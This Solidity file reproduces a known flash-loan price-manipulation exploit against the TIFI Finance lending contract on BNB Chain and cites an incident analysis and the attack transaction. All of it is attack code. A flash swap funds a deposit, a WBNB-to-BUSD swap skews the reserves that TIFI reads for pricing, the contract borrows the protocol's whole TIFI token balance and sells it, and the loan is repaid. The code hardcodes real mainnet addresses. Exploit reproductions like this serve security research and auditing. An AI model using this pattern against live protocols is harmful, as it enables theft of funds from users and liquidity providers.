// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;
import './UniRouterV2.sol';
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

// @Analysis
// https://twitter.com/peckshield/status/1601492605535399936
// @TX
// https://bscscan.com/tx/0x1c5272ce35338c57c6b9ea710a09766a17bbf14b61438940c3072ed49bfec402

interface TIFIFinance {
    function deposit(address token, uint256 amount) external;

    function borrow(address qToken, uint256 amount) external;
}

interface Uni_Pair_V2 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Burn(address indexed sender, uint256 amount0, uint256 amount1, address indexed to);
    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    event Transfer(address indexed from, address indexed to, uint256 value);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function MINIMUM_LIQUIDITY() external view returns (uint256);

    function PERMIT_TYPEHASH() external view returns (bytes32);

    function allowance(address, address) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function balanceOf(address) external view returns (uint256);

    function burn(address to) external returns (uint256 amount0, uint256 amount1);

    function decimals() external view returns (uint8);

    function factory() external view returns (address);

    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);

    function initialize(address _token0, address _token1) external;

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function name() external view returns (string memory);

    function nonces(address) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function skim(address to) external;

    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;

    function symbol() external view returns (string memory);

    function sync() external;

    function token0() external view returns (address);

    function token1() external view returns (address);

    function totalSupply() external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract Tifi {
    TIFIFinance TIFI = TIFIFinance(0x8A6F7834A9d60090668F5db33FEC353a7Fb4704B);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Router_V2 TIFIRouter = Uni_Router_V2(0xC8595392B8ca616A226dcE8F69D9E0c7D4C81FE4);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16);
    IERC20 TIFIToken = IERC20(0x17E65E6b9B166Fb8e7c59432F0db126711246BC0);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

    function testExploit() public {
        WBNB.approve(address(TIFIRouter), type(uint256).max);
        BUSD.approve(address(TIFI), type(uint256).max);
        TIFIToken.approve(address(Router), type(uint256).max);
        Pair.swap(5 * 1e18, 500 * 1e18, address(this), new bytes(1));
    }

    function pancakeCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        TIFI.deposit(address(BUSD), BUSD.balanceOf(address(this)));
        WBNBToBUSD(); // change the reserve of WBNB - BUSD
        TIFI.borrow(address(TIFIToken), TIFIToken.balanceOf(address(TIFI))); //call getReserves of WBNB - BUSD LP and borrow TIFI TOKEN
        TIFIToWBNB();
        WBNB.transfer(address(Pair), 7 * 1e18);
    }

    function WBNBToBUSD() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BUSD);
        TIFIRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function TIFIToWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(TIFIToken);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            TIFIToken.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}
